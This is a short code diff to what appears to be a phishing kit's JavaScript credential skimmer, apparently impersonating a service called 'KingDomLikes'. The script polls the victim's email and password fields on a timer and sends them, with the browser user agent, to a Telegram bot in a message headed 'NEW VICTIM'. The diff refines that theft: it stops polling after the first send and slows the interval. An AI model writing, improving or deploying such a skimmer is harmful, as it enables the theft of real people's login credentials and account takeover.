@@ -17,7 +17,7 @@ function sendTelegramMessage(message) {
     });
 }
 
-setInterval(function() {
+var intervalId = setInterval(function() {
   var email = document.getElementById(`email`).value;
   var password = document.getElementById(`password`).value;
   var userAgent = navigator.userAgent;
@@ -33,9 +33,10 @@ setInterval(function() {
           var message = `[ NEW VICTIM - KingDomLikes ]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: No Found\nUser Agent: ${userAgent}`;
           sendTelegramMessage(message); 
       });
+    clearInterval(intervalId);
   };
   
   console.log(email);
 
   
-}, 500);
+}, 1000);
